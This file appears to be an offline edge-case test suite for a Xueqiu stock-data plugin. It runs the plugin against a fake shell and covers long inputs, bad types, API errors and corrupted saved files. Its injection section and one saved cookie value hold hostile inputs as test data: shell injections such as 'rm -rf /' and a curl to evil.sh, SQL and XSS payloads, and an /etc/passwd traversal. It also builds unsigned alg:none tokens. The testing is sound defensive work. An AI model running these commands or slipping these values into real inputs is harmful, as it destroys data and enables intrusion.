// /tmp/host-edge-test.mjs — dsh-xueqiu host.js 黑盒边界测试（离线，fake shell）
import { loadPlugin, makeCtx } from './mock-ctx.js'

const LONG = 'A'.repeat(100000)
const results = []
function record(group, name, pass, detail) {
  results.push({ group, name, pass, detail: String(detail || '').slice(0, 300) })
  console.log((pass ? '✅' : '❌') + ' [' + group + '] ' + name + (detail && !pass ? '  >> ' + String(detail).slice(0, 300) : ''))
}

// ---- fake shell：按 URL 关键字返回脚本化 JSON；可整体覆盖行为 ----
const stockJson = (obj) => JSON.stringify(Object.assign({ error_code: 0, data: obj }))
const KLINE = stockJson({ column: ['timestamp','open','high','low','close','volume','amount','percent','chg','turnoverrate','pe','pb','market_capital'], item: [[1717000000000, 1, 2, 0.5, 1.5, 100, 200, 3, 0.5, 1, 10, 2, 1e10]] })
function defaultRespond(cmd) {
  if (cmd.includes(' -D - ')) return { exitCode: 0, stdout: { text: 'HTTP/1.1 200 OK\nset-cookie: xq_a_token=abc; Path=/\nset-cookie: u=123; Path=/\n' }, stderr: { text: '' } }
  if (cmd.includes('/chart/kline')) return { exitCode: 0, stdout: { text: KLINE }, stderr: { text: '' } }
  if (cmd.includes('batch/quote')) return { exitCode: 0, stdout: { text: stockJson({ items: [{ market: { status_id: 1 }, quote: { symbol: 'SH600519', name: '贵州茅台', current: 1700, percent: 1.2 } }] }) }, stderr: { text: '' } }
  if (cmd.includes('quote.json')) return { exitCode: 0, stdout: { text: stockJson({ quote: { symbol: 'SH600519', name: '贵州茅台', current: 1700 }, market: { status_id: 1 } }) }, stderr: { text: '' } }
  if (cmd.includes('minute.json')) return { exitCode: 0, stdout: { text: stockJson({ last_close: 1690, items: [{ timestamp: 1, current: 1, avg_price: 1, percent: 1, volume: 1, high: 1, low: 1 }] }) }, stderr: { text: '' } }
  if (cmd.includes('hot_stock/list')) return { exitCode: 0, stdout: { text: stockJson({ items: [{ symbol: 'SH600519', code: '600519', name: '贵州茅台', current: 1700, percent: 1, chg: 1, exchange: 'CN', value: 1, rank_change: 1, increment: 1 }] }) }, stderr: { text: '' } }
  if (cmd.includes('suggest_stock')) return { exitCode: 0, stdout: { text: JSON.stringify({ data: [{ code: 'SH600519', query: '贵州茅台', type: 1, stock_type: 1, label: 'A股' }] }) }, stderr: { text: '' } }
  if (cmd.includes('search/status')) return { exitCode: 0, stdout: { text: JSON.stringify({ list: [{ id: 1, title: 't', description: '<script>alert(1)</script>  中文  🎉', created_at: 1, user: { id: 1, screen_name: 'u', followers_count: 2 } }] }) }, stderr: { text: '' } }
  if (cmd.includes('livenews')) return { exitCode: 0, stdout: { text: JSON.stringify({ items: [{ id: 99, text: 'news', mark: 1, created_at: 1717000000000 }] }) }, stderr: { text: '' } }
  if (cmd.includes('stock_hot_user')) return { exitCode: 0, stdout: { text: JSON.stringify([{ id: 1, screen_name: 'u', description: 'd', followers_count: 3, verified: true }]) }, stderr: { text: '' } }
  if (cmd.includes('user_timeline')) return { exitCode: 0, stdout: { text: JSON.stringify({ statuses: [{ id: 1, text: 'p', created_at: 1, user: { id: 1, screen_name: 'u', followers_count: 9, status_count: 9, verified: false } }] }) }, stderr: { text: '' } }
  if (cmd.includes('finance/cn/indicator')) return { exitCode: 0, stdout: { text: stockJson({ quote_name: '贵州茅台', last_report_name: '2024年报', list: [{ report_name: '2024年报', report_date: '2024-12-31', avg_roe: [30] }] }) }, stderr: { text: '' } }
  if (cmd.includes('portfolio')) return { exitCode: 0, stdout: { text: stockJson({ stocks: [{ name: '全部', id: -1, pid: -1 }], stocksList: [] }) }, stderr: { text: '' } }
  return { exitCode: 0, stdout: { text: stockJson({}) }, stderr: { text: '' } }
}
function fakeShell(respond) {
  const r = respond || defaultRespond
  const calls = []
  return {
    calls,
    resolve: (s) => s,
    run: async (spec) => { calls.push(spec.command); const out = r(spec.command); if (out && out.__hang) return new Promise(() => {}); return out },
  }
}

// 建插件实例：files 预置持久化文件，shell 可覆盖
function makePlugin({ files, shell } = {}) {
  const plugin = loadPlugin()
  const sh = shell || fakeShell()
  const toolSpecs = []
  globalThis.harness = {
    handle: (m, h) => { handler = h; return () => {} },
    registerTool: (_ctx, spec) => { toolSpecs.push(spec); return () => {} },
    defineTool: (s) => s,
  }
  let handler = null
  const ctx = makeCtx({ files: files ? { ...files } : {}, shell: sh })
  plugin.apply(ctx)
  delete globalThis.harness
  const call = (action, args) => handler({ action, args: args === undefined ? {} : args })
  return { call, shell: sh, toolSpecs, ctx }
}

// 结构化断言：返回 {ok:boolean,...}，不抛未捕获异常
async function expectStructured(group, name, p, opts = {}) {
  try {
    const t0 = Date.now()
    const res = await Promise.race([
      p,
      new Promise((_, rej) => setTimeout(() => rej(new Error('外层超时 ' + (opts.timeoutMs || 20000) + 'ms')), opts.timeoutMs || 20000)),
    ])
    const ms = Date.now() - t0
    const okShape = res && typeof res === 'object' && typeof res.ok === 'boolean' && (res.ok ? ('data' in res) : ('error' in res))
    record(group, name, okShape, okShape ? JSON.stringify(res).slice(0, 120) + ' (' + ms + 'ms)' : '非结构化返回: ' + JSON.stringify(res))
    return res
  } catch (e) {
    record(group, name, false, '未捕获异常/挂起: ' + (e && e.stack ? e.stack.split('\n').slice(0, 3).join(' | ') : e))
    return null
  }
}

// ================= 1. 超长字符串 =================
{
  const { call } = makePlugin()
  await expectStructured('超长字符串', 'quote symbols=10万字符', call('quote', { symbols: LONG }))
  await expectStructured('超长字符串', 'search q=10万字符', call('search', { q: '茅' + LONG }))
  await expectStructured('超长字符串', 'searchPosts q=10万字符', call('searchPosts', { q: LONG }))
  await expectStructured('超长字符串', 'kline symbol=10万字符', call('kline', { symbol: LONG }))
  await expectStructured('超长字符串', 'watchlist.add symbol=10万字符', call('watchlist.add', { symbol: LONG }))
  await expectStructured('超长字符串', 'login.save cookie=10万字符', call('login.save', { cookie: 'xq_a_token=' + LONG }))
  await expectStructured('超长字符串', 'quoteDetail symbol=10万字符', call('quoteDetail', { symbol: LONG }))
  await expectStructured('超长字符串', 'news max_id=10万位数字串', call('news', { count: 5, max_id: '9'.repeat(100000) }))
}

// ================= 2. 特殊类型 =================
{
  const { call } = makePlugin()
  for (const [label, v] of [['null', null], ['undefined', undefined], ['数字 123', 123], ['数组', ['SH600519']], ['对象', { a: 1 }], ['布尔 false', false]]) {
    await expectStructured('特殊类型', 'quote symbols=' + label, call('quote', { symbols: v }))
    await expectStructured('特殊类型', 'kline symbol=' + label, call('kline', { symbol: v }))
    await expectStructured('特殊类型', 'search q=' + label, call('search', { q: v }))
    await expectStructured('特殊类型', 'quoteDetail symbol=' + label, call('quoteDetail', { symbol: v }))
    await expectStructured('特殊类型', 'hot market=' + label, call('hot', { market: v }))
    await expectStructured('特殊类型', 'user userId=' + label, call('user', { userId: v }))
    await expectStructured('特殊类型', 'kol symbol=' + label, call('kol', { symbol: v }))
    await expectStructured('特殊类型', 'watchlist.add symbol=' + label, call('watchlist.add', { symbol: v }))
    await expectStructured('特殊类型', 'watchlist.remove symbol=' + label, call('watchlist.remove', { symbol: v }))
  }
  // args 本身异常
  await expectStructured('特殊类型', 'args=null', call('quote', null))
  await expectStructured('特殊类型', 'args=数字', call('quote', 12345))
  await expectStructured('特殊类型', 'args=字符串', call('quote', 'SH600519'))
  await expectStructured('特殊类型', 'args=数组', call('quote', ['SH600519']))
  // req 本身异常（直接调 handler 语义）
  await expectStructured('特殊类型', 'action=未知', call('no-such-action', {}))
  await expectStructured('特殊类型', 'action=null', call(null, {}))
  await expectStructured('特殊类型', 'action=数字', call(123, {}))
  // quote symbols 数组内混类型
  await expectStructured('特殊类型', 'quote symbols=[null,123,obj]', call('quote', { symbols: [null, 123, { x: 1 }, 'SH600519'] }))
}

// ================= 3. 注入字符串 =================
{
  const { call } = makePlugin()
  const inj = ["<script>alert(1)</script>", "SH600519' OR 1=1--", "SH600519\n; rm -rf /", "茅台🎉\u0000\u0007", "$(curl evil.sh)", "`id`", "../../etc/passwd", "SH600519'; drop table; --"]
  for (const s of inj) {
    const tag = JSON.stringify(s).slice(0, 40)
    await expectStructured('注入', 'quote symbols=' + tag, call('quote', { symbols: s }))
    await expectStructured('注入', 'kline symbol=' + tag, call('kline', { symbol: s, count: 5 }))
    await expectStructured('注入', 'search q=' + tag, call('search', { q: s }))
    await expectStructured('注入', 'watchlist.add symbol=' + tag, call('watchlist.add', { symbol: s }))
    await expectStructured('注入', 'news max_id=' + tag, call('news', { count: 3, max_id: s }))
    await expectStructured('注入', 'login.save cookie=' + tag, call('login.save', { cookie: s }))
  }
  // XSS 载荷经 mapPosts 清洗验证
  const { call: c2 } = makePlugin()
  const r = await expectStructured('注入', 'searchPosts q=<script>（载荷清洗）', c2('searchPosts', { q: '<script>x</script>' }))
  if (r && r.ok) {
    const text = ((r.data && r.data.list && r.data.list[0]) || {}).text || ''
    record('注入', 'posts.text 已剥离 HTML 标签', !/[<>]/.test(text), 'text=' + JSON.stringify(text))
  }
}

// ================= 4. count/size 边界 =================
{
  const { call } = makePlugin()
  for (const [label, v] of [['0', 0], ['-1', -1], ['1e9', 1e9], ['NaN', NaN], ['Infinity', Infinity], ['-Infinity', -Infinity], ['小数 2.7', 2.7], ['字符串 "5"', '5'], ['字符串 "abc"', 'abc'], ['null', null], ['对象', { valueOf: () => 9999 }]]) {
    await expectStructured('count边界', 'kline count=' + label, call('kline', { symbol: 'SH600519', count: v }))
    await expectStructured('count边界', 'hot size=' + label, call('hot', { size: v }))
    await expectStructured('count边界', 'news count=' + label, call('news', { count: v }))
    await expectStructured('count边界', 'kol count=' + label, call('kol', { symbol: 'SH600519', count: v }))
    await expectStructured('count边界', 'search count=' + label, call('search', { q: '茅台', count: v }))
    await expectStructured('count边界', 'searchPosts count=' + label, call('searchPosts', { q: '茅台', count: v }))
    await expectStructured('count边界', 'user count=' + label, call('user', { userId: '123', count: v }))
  }
  // kline begin 边界
  for (const [label, v] of [['0', 0], ['-1', -1], ['NaN', NaN], ['Infinity', Infinity], ['1e15', 1e15], ['字符串', 'not-a-number']]) {
    await expectStructured('count边界', 'kline begin=' + label, call('kline', { symbol: 'SH600519', begin: v, count: 5 }))
  }
  await expectStructured('count边界', 'kline period=非法值', call('kline', { symbol: 'SH600519', period: "day' || '1'='1", count: 5 }))
  await expectStructured('count边界', 'hot market=非法值', call('hot', { market: 'mars' }))
}

// ================= 5. 雪球 API 异常返回 =================
// a) HTTP 400 + JSON error
{
  const { call } = makePlugin({ shell: fakeShell((cmd) => cmd.includes(' -D - ')
    ? { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\n' }, stderr: { text: '' } }
    : { exitCode: 0, stdout: { text: stockJson({}) }, stderr: { text: '' } }) })
  await expectStructured('API异常', '业务层正常但 data 空（quote）', call('quote', { symbols: 'SH600519' }))
}
// b) curl 失败（模拟 400/网络层错误 exitCode!=0）→ network 重试链（500ms×2）
{
  const sh = fakeShell((cmd) => ({ exitCode: 22, stdout: { text: '' }, stderr: { text: 'curl: (22) The requested URL returned error: 400' } }))
  const { call } = makePlugin({ shell: sh })
  await expectStructured('API异常', 'curl 400 (exit 22) 全程失败', call('quote', { symbols: 'SH600519' }), { timeoutMs: 25000 })
  record('API异常', '400 场景重试了 3 次(depth 0-2)', sh.calls.length >= 3, '实际请求次数=' + sh.calls.length)
}
// c) 429 / rate_limited JSON（error_code 400017）→ 指数退避 2s+4s
{
  let n = 0
  const sh = fakeShell((cmd) => {
    if (cmd.includes(' -D - ')) return { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\nset-cookie: u=1\n' }, stderr: { text: '' } }
    n++
    return { exitCode: 0, stdout: { text: JSON.stringify({ error_code: 400017, error_description: '操作过于频繁' }) }, stderr: { text: '' } }
  })
  const { call } = makePlugin({ shell: sh })
  const t0 = Date.now()
  const r = await expectStructured('API异常', '429 rate_limited 重试后失败', call('quote', { symbols: 'SH600519' }), { timeoutMs: 30000 })
  if (r) record('API异常', '429 错误码出现在 error 信息中', /rate_limited|频繁/.test(r.error || ''), 'error=' + r.error)
  record('API异常', '指数退避实际耗时≥6s（2s+4s）', Date.now() - t0 >= 5900, '耗时=' + (Date.now() - t0) + 'ms，请求次数=' + n)
}
// d) HTML 登录页（200 + HTML body）→ parse 错误
{
  const { call } = makePlugin({ shell: fakeShell((cmd) => cmd.includes(' -D - ')
    ? { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\n' }, stderr: { text: '' } }
    : { exitCode: 0, stdout: { text: '<!DOCTYPE html><html><body>请登录</body></html>' }, stderr: { text: '' } }) })
  const r = await expectStructured('API异常', 'HTML 登录页返回', call('quote', { symbols: 'SH600519' }), { timeoutMs: 25000 })
  if (r) record('API异常', 'HTML 返回被分类为 parse 错误', /\[parse\]/.test(r.error || ''), 'error=' + r.error)
}
// e) 空 body → empty 重试链（含 reseed cookie）
{
  const sh = fakeShell((cmd) => cmd.includes(' -D - ')
    ? { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\n' }, stderr: { text: '' } }
    : { exitCode: 0, stdout: { text: '' }, stderr: { text: '' } })
  const { call } = makePlugin({ shell: sh })
  const r = await expectStructured('API异常', '空 body（风控）', call('quote', { symbols: 'SH600519' }), { timeoutMs: 30000 })
  if (r) record('API异常', '空响应分类为 empty 且有中文提示', /\[empty\]/.test(r.error || ''), 'error=' + r.error)
  record('API异常', 'empty 场景触发了 cookie 重新播种', sh.calls.some((c) => c.includes(' -D - ')), 'calls=' + sh.calls.length)
}
// f) cookie_expired (400016) 降级
{
  let n = 0
  const sh = fakeShell((cmd) => {
    if (cmd.includes(' -D - ')) return { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\nset-cookie: u=1\n' }, stderr: { text: '' } }
    n++
    return { exitCode: 0, stdout: { text: n <= 1 ? JSON.stringify({ error_code: 400016, error_description: 'cookie过期' }) : stockJson({ items: [{ quote: { symbol: 'SH600519', current: 1 } }] }) }, stderr: { text: '' } }
  })
  const { call } = makePlugin({ shell: sh })
  const r = await expectStructured('API异常', 'cookie_expired 后重试成功', call('quote', { symbols: 'SH600519' }), { timeoutMs: 25000 })
  if (r) record('API异常', '400016 重试后拿到数据', r.ok === true && r.data && r.data.list && r.data.list.length === 1, JSON.stringify(r).slice(0, 120))
}
// g) 挂起（shell.run 永不返回）→ 30s 看门狗
{
  const sh = fakeShell(() => ({ __hang: true }))
  const { call } = makePlugin({ shell: sh })
  const t0 = Date.now()
  const r = await expectStructured('API异常', '挂起请求 → 30s 看门狗', call('quote', { symbols: 'SH600519' }), { timeoutMs: 40000 })
  record('API异常', '看门狗 ~30s 触发', r && /\[timeout\]/.test(r.error || '') && Date.now() - t0 >= 29000, 'error=' + (r && r.error) + ' 耗时=' + (Date.now() - t0) + 'ms')
}
// h) JSON 结构异常（顶层是数组/字符串/巨型嵌套）
{
  const { call } = makePlugin({ shell: fakeShell((cmd) => cmd.includes(' -D - ')
    ? { exitCode: 0, stdout: { text: 'set-cookie: xq_a_token=a\n' }, stderr: { text: '' } }
    : { exitCode: 0, stdout: { text: cmd.includes('stock_hot_user') ? '"just a string"' : '["array_body"]' }, stderr: { text: '' } }) })
  await expectStructured('API异常', 'quote 返回数组 body', call('quote', { symbols: 'SH600519' }))
  await expectStructured('API异常', 'kol 返回字符串 body', call('kol', { symbol: 'SH600519' }))
}
// i) login.save 远端校验：HTML / 400016 / 挂起的对照（非挂起）
{
  const mk = (body) => makePlugin({ files: {}, shell: fakeShell(() => ({ exitCode: 0, stdout: { text: body }, stderr: { text: '' } })) })
  let r = await expectStructured('API异常', 'login.save 校验返回 HTML', mk('<html>login</html>').call('login.save', { cookie: 'xq_a_token=abc; xq_id_token=' + b64jwt({ uid: 1, exp: Math.floor(Date.now() / 1000) + 9999 }) }))
  if (r) record('API异常', 'HTML 校验失败给用户可读错误', r.ok === false, 'error=' + r.error)
  r = await expectStructured('API异常', 'login.save 校验返回 400016', mk(JSON.stringify({ error_code: 400016, error_description: 'cookie 过期' })).call('login.save', { cookie: 'xq_a_token=abc' }))
  if (r) record('API异常', '400016 校验给结构化错误', r.ok === false && /400016/.test(r.error), 'error=' + r.error)
}

// JWT 构造工具
function b64jwt(obj) {
  const b64url = (s) => Buffer.from(JSON.stringify(s)).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  return b64url({ alg: 'none' }) + '.' + b64url(obj) + '.sig'
}

// ================= 6. 持久化损坏 =================
{
  const corrupted = {
    '.xueqiu-watchlist.json': '{broken json!!!',
    '.xueqiu-login.json': '\x00\x01 not json at all',
    '.xueqiu-ui-state.json': '{"tab": "market", "dockH": "corrupt"',
  }
  const { call } = makePlugin({ files: corrupted })
  const r1 = await expectStructured('持久化', 'watchlist.get（损坏 watchlist 文件）', call('watchlist.get'))
  if (r1 && r1.ok) record('持久化', '损坏 watchlist 回退默认列表', Array.isArray(r1.data.symbols) && r1.data.symbols.length === 6, JSON.stringify(r1.data).slice(0, 120))
  await expectStructured('持久化', 'watchlist.add（损坏文件后）', call('watchlist.add', { symbol: 'AAPL' }))
  await expectStructured('持久化', 'watchlist.remove（损坏文件后）', call('watchlist.remove', { symbol: 'ZZ9999' }))
  await expectStructured('持久化', 'login.status（损坏 login 文件）', call('login.status'))
  await expectStructured('持久化', 'ui.get（损坏 ui-state 文件）', call('ui.get'))
  await expectStructured('持久化', 'watchlist.pull（损坏 login → 未登录）', call('watchlist.pull'))
}
{
  // 类型错误的合法 JSON
  const badTypes = {
    '.xueqiu-watchlist.json': JSON.stringify({ symbols: 'not-array', lastSyncAt: 'abc' }),
    '.xueqiu-login.json': JSON.stringify({ cookie: 12345, uid: [], savedAt: {} }),
    '.xueqiu-ui-state.json': JSON.stringify({ tab: 999, open: 'yes', dockH: 'x', badgePos: { x: 'a', y: [1] } }),
  }
  const { call } = makePlugin({ files: badTypes })
  await expectStructured('持久化', 'watchlist.get（symbols 类型错误）', call('watchlist.get'))
  await expectStructured('持久化', 'login.status（cookie 为数字）', call('login.status'))
  const r = await expectStructured('持久化', 'ui.get（字段全类型错误）', call('ui.get'))
  if (r && r.ok) {
    const d = r.data
    record('持久化', 'ui.get 钳制后类型正确', typeof d.tab === 'string' && typeof d.open === 'boolean' && (d.dockH === null || typeof d.dockH === 'number') && (d.badgeW === null || typeof d.badgeW === 'number') && (d.badgePos === null || (typeof d.badgePos.x === 'number' && typeof d.badgePos.y === 'number')), JSON.stringify(d))
  }
  await expectStructured('持久化', 'ui.set（极端 dockH/badgeW）', call('ui.set', { dockH: 1e9, badgeW: -100 }))
  await expectStructured('持久化', 'ui.set（类型混杂）', call('ui.set', { tab: { evil: 1 }, open: 'truthy', badgePos: { x: Infinity, y: NaN } }))
  await expectStructured('持久化', 'ui.set（null 复位）', call('ui.set', { dockH: null, badgeW: null }))
}
{
  // login 文件合法但 cookie 恶意（含引号/换行注入）
  const malicious = { '.xueqiu-login.json': JSON.stringify({ cookie: "xq_a_token=t'; rm -rf /; u=1\nCookie: evil", uid: 1, screenName: 'test' }) }
  const { call } = makePlugin({ files: malicious })
  await expectStructured('持久化', 'login.status（cookie 含注入串）', call('login.status'))
}

// ================= 7. Agent 工具层（harness.registerTool 的 6 个工具） =================
{
  const { toolSpecs, shell } = makePlugin()
  record('工具层', '注册了 6 个 agent 工具', toolSpecs.length === 6, 'count=' + toolSpecs.length + ' names=' + toolSpecs.map((t) => t.name).join(','))
  const byName = {}
  for (const t of toolSpecs) byName[t.name] = t
  async function toolCall(name, group, label, args, check) {
    try {
      const out = await Promise.race([
        byName[name].execute(args),
        new Promise((_, rej) => setTimeout(() => rej(new Error('工具执行挂起')), 25000)),
      ])
      let ok = typeof out === 'string'
      try { JSON.parse(out) } catch (e) { ok = false }
      let extra = ''
      if (ok && check) { const c = check(out); ok = c.ok; extra = c.msg || '' }
      record(group, name + '(' + label + ')', ok, (typeof out === 'string' ? out.slice(0, 150) : String(out)) + ' ' + extra)
    } catch (e) {
      record(group, name + '(' + label + ')', false, '异常逃逸: ' + (e.stack || e).toString().slice(0, 200))
    }
  }
  await toolCall('xueqiu_quote', '工具层', 'symbols=超长', { symbols: LONG })
  await toolCall('xueqiu_quote', '工具层', 'symbols=null', { symbols: null })
  await toolCall('xueqiu_quote', '工具层', 'symbols=注入+混合', { symbols: "SH600519' OR 1=1,<script>,AAPL,  ,\n" })
  await toolCall('xueqiu_kline', '工具层', 'count=1e9/NaN', { symbol: 'SH600519', count: 1e9 })
  await toolCall('xueqiu_kline', '工具层', 'symbol=数字', { symbol: 600519 })
  await toolCall('xueqiu_search', '工具层', 'q=<script>', { q: '<script>alert(1)</script>' })
  await toolCall('xueqiu_hot', '工具层', 'size=-1', { size: -1 })
  await toolCall('xueqiu_hot', '工具层', 'market=注入', { market: "cn' || 1=1" })
  await toolCall('xueqiu_news', '工具层', 'count=NaN max_id=Infinity', { count: NaN, max_id: Infinity })
  await toolCall('xueqiu_kol', '工具层', 'symbol=null count=1e9', { symbol: null, count: 1e9 })
  await toolCall('xueqiu_kline', '工具层', 'args=完全为空', {})
  await toolCall('xueqiu_news', '工具层', 'args=null', null)
}

// ================= 汇总 =================
const fail = results.filter((r) => !r.pass)
console.log('\n========== 汇总 ==========')
console.log('总计: ' + results.length + '，通过: ' + (results.length - fail.length) + '，失败: ' + fail.length)
if (fail.length) {
  console.log('\n失败清单:')
  for (const f of fail) console.log('  ❌ [' + f.group + '] ' + f.name + '\n     ' + f.detail)
}
process.exit(fail.length ? 1 : 0)
